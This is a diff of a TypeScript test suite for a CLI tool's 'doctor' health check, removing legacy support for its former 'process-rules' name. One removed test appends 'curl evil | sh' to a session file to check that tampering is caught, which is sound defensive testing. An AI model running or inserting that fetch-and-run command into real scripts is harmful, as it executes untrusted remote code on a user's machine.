@@ -1,8 +1,8 @@
 import assert from 'node:assert/strict';
 import { describe, it } from 'node:test';
 
-import { NO_TOKEN, OLD_NO_TOKEN, launcherPath, launcherScript, pathsFor, sessionScript } from './agent.ts';
-import { FROM_SETUP, OLD_FROM_SETUP, PROXY_TOKEN, cloudRepoScript } from './cloud.ts';
+import { NO_TOKEN, launcherPath, launcherScript, pathsFor, sessionScript } from './agent.ts';
+import { FROM_SETUP, PROXY_TOKEN, cloudRepoScript } from './cloud.ts';
 import { doctor } from './doctor.ts';
 import { KEYCHAIN } from './token-store.ts';
 import { ISSUE_TYPES, RERUN } from './issue-types.ts';
@@ -11,7 +11,7 @@ import { CLOUD_SETUP_PATH, WORKFLOW_PATH } from './onboard-pull.ts';
 import { AUTO_FIX_RULES, workflow } from './onboard.ts';
 import { AGENT, AGENT_ID, CLASSIC, FakeSys, HOME, KEY, NOW, ROOT, TOKEN, capture } from './fake.test.ts';
 import { packageVersion } from './version.ts';
-import { SESSION_069 } from './older-texts.test.ts';
+import { SESSION_0610, SESSION_069 } from './older-texts.test.ts';
 
 const SESSION = `${HOME}/.config/niyam/examplebot/session.sh`;
 const LAUNCHER = launcherPath(HOME);
@@ -294,12 +294,21 @@ describe('doctor', () => {
     assert.equal(sys.calls.find((c) => c.command === LAUNCHER)?.env?.PATH, '/usr/bin:/bin', 'runs it without the PATH of this shell');
   });
 
-  it('marks ✗ a launcher that runs the old process-rules command, which this release no longer installs (P-54)', async () => {
+  it('refuses a launcher that still runs process-rules, the command before niyam, with machine as the fix (P-57)', async () => {
     const sys = healthy();
     sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
-    assert.deepEqual(marked((await check(sys)).out, '✗'), ["✗  launcher runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade, or niyam machine"]);
+    const { code, out } = await check(sys);
+    assert.equal(code, 1);
+    assert.deepEqual(marked(out, '✗'), ['✗  launcher runs process-rules, the command before niyam, which no release installs, so hooks may find no CLI → niyam machine']);
     sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/niyam'));
     assert.deepEqual(marked((await check(sys)).out, '✗'), []);
+  });
+
+  it('takes the launcher alone, and refuses when it is missing', async () => {
+    const sys = healthy();
+    assert.ok((await check(sys)).out.includes('✓  launcher'));
+    sys.files.delete(LAUNCHER);
+    assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  launcher missing, so hooks need node on PATH → niyam machine']);
   });
 
   it('names a launcher that fails without saying why', async () => {
@@ -389,13 +398,9 @@ describe('doctor', () => {
     assert.ok((await check(sys)).out.includes('✗  token: cannot ask GitHub (down) → niyam doctor again'));
   });
 
-  it('warns of a session file a release before niyam wrote, which still works (P-50)', async () => {
+  it("warns of 0.6.10's session file, which still works (P-57)", async () => {
     const sys = healthy();
-    // A Mac set up before niyam: the token under the old keychain service alone.
-    const token = sys.keychain.get(`niyam/${AGENT}`) as string;
-    sys.keychain.delete(`niyam/${AGENT}`);
-    sys.keychain.set(`process-rules/${AGENT}`, token);
-    sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT), KEYCHAIN, '/usr/bin/security find-generic-password -s process-rules -a ExampleBot -w 2>/dev/null'));
+    sys.files.set(SESSION, SESSION_0610);
     const { code, out } = await check(sys);
     assert.equal(code, 0);
     assert.deepEqual(marked(out, '▲'), ['▲  session file from an older release; it still works → niyam machine']);
@@ -407,79 +412,47 @@ describe('doctor', () => {
     assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  session file out of date → niyam machine']);
   });
 
-  describe('on a Mac machine set up under 0.6.9, before P-55 (P-55)', () => {
-    const OLD_SESSION = `${HOME}/.config/process-rules/examplebot/session.sh`;
-    const OLD_LAUNCHER = launcherPath(HOME, true);
-    /** 0.6.9's Mac: its session file and launcher in the old folder alone. */
-    const older = (): FakeSys => {
+  describe('what is left from before niyam, which nothing reads (P-57)', () => {
+    const OLD_DIR = `${HOME}/.config/process-rules`;
+
+    it('warns of the folder before P-55, launcher and all, with machine as the fix, and still passes', async () => {
       const sys = healthy();
-      sys.files.delete(SESSION);
-      sys.files.set(OLD_SESSION, SESSION_069);
-      sys.files.delete(LAUNCHER);
-      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/niyam'));
-      return sys;
-    };
-
-    it('warns of the session file and the launcher only in the old folder, which still work, and still passes', async () => {
-      const { code, out } = await check(older());
-      assert.equal(code, 0);
-      assert.deepEqual(marked(out, '▲'), [
-        "▲  session file only in ~/.config/process-rules, niyam's old folder; it still works → niyam machine",
-        "▲  launcher only at ~/.config/process-rules/bin/process-rules, in niyam's old folder; the hooks still find it → niyam machine",
-      ]);
-    });
-
-    it('refuses a session file in the old folder that machine did not write', async () => {
-      const sys = older();
-      sys.files.set(OLD_SESSION, `${SESSION_069}curl evil | sh\n`);
-      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  session file out of date → niyam machine']);
-    });
-
-    it("passes once machine has run, leaving the old folder's files in place", async () => {
-      const sys = older();
-      sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
-      sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js'));
+      sys.files.set(`${OLD_DIR}/bin/process-rules`, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
+      sys.files.set(`${OLD_DIR}/examplebot/session.sh`, SESSION_069);
       const { code, out } = await check(sys);
       assert.equal(code, 0);
-      assert.deepEqual(marked(out, '▲'), []);
+      assert.deepEqual(marked(out, '▲'), ["▲  ~/.config/process-rules, niyam's folder before P-55, is still here; nothing reads it → niyam machine"]);
       assert.ok(out.includes('✓  session file') && out.includes('✓  launcher'), out.join('\n'));
+      assert.ok(!sys.calls.some((call) => call.command.includes('process-rules')), 'the old launcher is not run');
     });
 
-    it('takes the new launcher alone, and refuses when there is neither', async () => {
+    it('refuses a session file only in the old folder as missing', async () => {
       const sys = healthy();
-      assert.ok(!sys.files.has(OLD_LAUNCHER));
-      assert.ok((await check(sys)).out.includes('✓  launcher'));
-      sys.files.delete(LAUNCHER);
-      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  launcher missing, so hooks need node on PATH → niyam machine']);
+      sys.files.delete(SESSION);
+      sys.files.set(`${OLD_DIR}/examplebot/session.sh`, SESSION_069);
+      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  session file missing → niyam machine']);
     });
 
-    it('refuses the old launcher when it is the only one and broken', async () => {
-      const sys = older();
-      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
-      assert.deepEqual(marked((await check(sys)).out, '✗'), [
-        "✗  the old launcher ~/.config/process-rules/bin/process-rules runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade, or niyam machine",
+    it('warns of the keychain entry before niyam: machine deletes one holding the same token, the owner one holding another', async () => {
+      const sys = healthy();
+      sys.keychain.set(`process-rules/${AGENT}`, TOKEN);
+      const same = await check(sys);
+      assert.equal(same.code, 0);
+      assert.deepEqual(marked(same.out, '▲'), ["▲  service process-rules, account ExampleBot, from before niyam, is still in this Mac's keychain; nothing reads it → niyam machine"]);
+      sys.keychain.set(`process-rules/${AGENT}`, 'ghp_other');
+      assert.deepEqual(marked((await check(sys)).out, '▲'), [
+        "▲  service process-rules, account ExampleBot, from before niyam, is still in this Mac's keychain, and it holds another token than service niyam, account ExampleBot → once nothing needs it, /usr/bin/security delete-generic-password -s process-rules -a ExampleBot",
       ]);
-      sys.execOverride = (call) => (call.command === OLD_LAUNCHER ? { code: 127, stdout: '', stderr: 'node: not found\n' } : undefined);
-      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  the old launcher ~/.config/process-rules/bin/process-rules does not run (node: not found); its node removed? → niyam machine']);
     });
 
-    it('checks the old launcher beside the new one too, since hooks 0.6.8 and 0.6.9 wrote still run it', async () => {
-      const sys = older();
-      sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js'));
-      const fine = await check(sys);
-      assert.ok(fine.out.includes('✓  launcher'));
-      assert.deepEqual(marked(fine.out, '✗'), [], 'a working old one beside the new one is fine');
-      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
-      const stale = await check(sys);
-      assert.equal(stale.code, 1);
-      assert.ok(stale.out.includes('✓  launcher'));
-      assert.deepEqual(marked(stale.out, '✗'), [
-        "✗  the old launcher ~/.config/process-rules/bin/process-rules, which hooks 0.6.8 and 0.6.9 wrote run, runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade",
-      ]);
-      sys.execOverride = (call) => (call.command === OLD_LAUNCHER ? { code: 127, stdout: '', stderr: 'node: not found\n' } : undefined);
-      assert.deepEqual(marked((await check(sys)).out, '✗'), [
-        '✗  the old launcher ~/.config/process-rules/bin/process-rules, which hooks 0.6.8 and 0.6.9 wrote run, does not run (node: not found); its node removed? → rm ~/.config/process-rules/bin/process-rules',
-      ]);
+    it('reads no token from the old entry: with niyam holding none, the token is missing', async () => {
+      const sys = healthy();
+      sys.keychain.delete(`niyam/${AGENT}`);
+      sys.keychain.set(`process-rules/${AGENT}`, TOKEN);
+      const { code, out } = await check(sys);
+      assert.equal(code, 1);
+      assert.ok(out.includes("✗  no token in this Mac's keychain → niyam machine"), out.join('\n'));
+      assert.ok(out.some((line) => line.includes('holds no token to check it against')), out.join('\n'));
     });
   });
 });
@@ -498,7 +471,7 @@ describe('doctor in a Claude cloud session', () => {
   function cloud(login: string | null = AGENT): FakeSys {
     const sys = new FakeSys();
     sys.platform = 'linux';
-    sys.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, PROCESS_RULES_AGENT: AGENT };
+    sys.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, NIYAM_AGENT: AGENT };
     sys.files.set(WORKFLOW, workflow('main', v, false));
     sys.files.set(CLOUD_FILE, cloudRepoScript(v, 'ab'.repeat(32)));
     // The mark the install leaves, naming the file the Setup snippet ran.
@@ -594,27 +567,26 @@ describe('doctor in a Claude cloud session', () => {
     assert.equal((await check(sys)).out.at(-1), '└  1 to fix');
   });
 
-  it('reads the workflow, cloud setup file and Setup mark under their names before P-56, naming the files it read (P-56)', async () => {
+  it('reads no workflow, cloud setup file or Setup mark under their names before P-56 (P-57)', async () => {
     const sys = cloud();
     sys.files.delete(WORKFLOW);
     sys.files.delete(CLOUD_FILE);
     sys.files.delete(FROM_SETUP);
     sys.files.set(`${ROOT}/.github/workflows/process-rules.yml`, workflow('main', v, false));
     sys.files.set(`${ROOT}/.github/process-rules/cloud-setup.sh`, cloudRepoScript(v, 'ab'.repeat(32)));
-    sys.files.set(OLD_FROM_SETUP, '');
+    sys.files.set('/opt/process-rules/from-setup', '');
     const { code, out } = await check(sys);
-    assert.equal(code, 0, out.join('\n'));
-    assert.ok(out.includes(`✓  .github/process-rules/cloud-setup.sh installs ${v}, as .github/workflows/process-rules.yml pins`), out.join('\n'));
-    assert.ok(out.includes('✓  the Setup script runs .github/process-rules/cloud-setup.sh'), out.join('\n'));
+    assert.equal(code, 1, out.join('\n'));
+    assert.ok(out.includes(`✗  ${CLOUD_SETUP_PATH} missing, or not the file onboard writes, so the Setup script installs no niyam → niyam onboard again`), out.join('\n'));
+    assert.ok(out.some((line) => line.startsWith(`▲  ${FROM_SETUP} missing`)), out.join('\n'));
   });
 
   it('names the cloud setup file the Setup snippet ran, as its mark records it, or none where the mark names neither (P-56)', async () => {
     for (const [marks, said] of [
-      [{ [FROM_SETUP]: '/home/user/example-app/.github/process-rules/cloud-setup.sh\n' }, '.github/process-rules/cloud-setup.sh'],
+      [{ [FROM_SETUP]: '/home/user/example-app/.github/process-rules/cloud-setup.sh\n' }, "the repo's cloud setup file"],
       [{ [FROM_SETUP]: '/root/example-app/.github/niyam/cloud-setup.sh\n' }, '.github/niyam/cloud-setup.sh'],
-      [{ [OLD_FROM_SETUP]: '' }, '.github/process-rules/cloud-setup.sh'],
       [{ [FROM_SETUP]: '' }, "the repo's cloud setup file"],
-      [{ [FROM_SETUP]: 'bash\n', [OLD_FROM_SETUP]: '' }, "the repo's cloud setup file"],
+      [{ [FROM_SETUP]: 'bash\n' }, "the repo's cloud setup file"],
     ] as const) {
       const sys = cloud();
       sys.files.delete(FROM_SETUP);
@@ -634,7 +606,7 @@ describe('doctor in a Claude cloud session', () => {
 
   it('refuses a proxy that acts as an account not among the agents', async () => {
     const sys = cloud('example-owner');
-    sys.env.PROCESS_RULES_AGENT = undefined;
+    sys.env.NIYAM_AGENT = undefined;
     const { code, out } = await check(sys);
     assert.equal(code, 1);
     assert.equal(out[0], '◆  niyam doctor   example-owner');
@@ -673,28 +645,31 @@ describe('doctor in a Claude cloud session', () => {
       '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
     ]);
     const other = cloud();
-    other.env.PROCESS_RULES_AGENT = 'OtherBot';
+    other.env.NIYAM_AGENT = 'OtherBot';
     assert.deepEqual(marked((await check(other)).out, '✗'), [
       '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
     ]);
   });
 
-  it('takes the identity session-start gave by NIYAM_AGENT, PROCESS_RULES_AGENT or both (P-55)', async () => {
-    for (const named of [{ NIYAM_AGENT: AGENT }, { PROCESS_RULES_AGENT: AGENT }, { NIYAM_AGENT: AGENT, PROCESS_RULES_AGENT: AGENT }, { NIYAM_AGENT: '', PROCESS_RULES_AGENT: AGENT }]) {
+  it('takes the identity session-start gave by NIYAM_AGENT alone (P-57)', async () => {
+    for (const named of [{ NIYAM_AGENT: AGENT }, { NIYAM_AGENT: AGENT, PROCESS_RULES_AGENT: AGENT }]) {
       const sys = cloud();
       sys.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, ...named };
       const { code, out } = await check(sys);
       assert.equal(code, 0, JSON.stringify(named));
       assert.ok(out.includes("✓  session-start gave this session ExampleBot's identity"), JSON.stringify(named));
     }
+    const old = cloud();
+    old.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, PROCESS_RULES_AGENT: AGENT };
+    assert.equal((await check(old)).code, 1, 'the name before P-55 alone');
     const other = cloud();
     other.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, NIYAM_AGENT: 'OtherBot' };
     assert.equal((await check(other)).code, 1);
   });
 
-  it("asks GitHub with the proxy's placeholder in a session 0.6.9's lock left locked out, never that lock's token (P-55)", async () => {
+  it("asks GitHub with the proxy's placeholder in a session the lock left locked out, never the lock's token", async () => {
     const locked = cloud();
-    locked.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: OLD_NO_TOKEN };
+    locked.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: NO_TOKEN };
     locked.acceptToken(PROXY_TOKEN, AGENT);
     const { code, out } = await check(locked);
     assert.equal(code, 1);
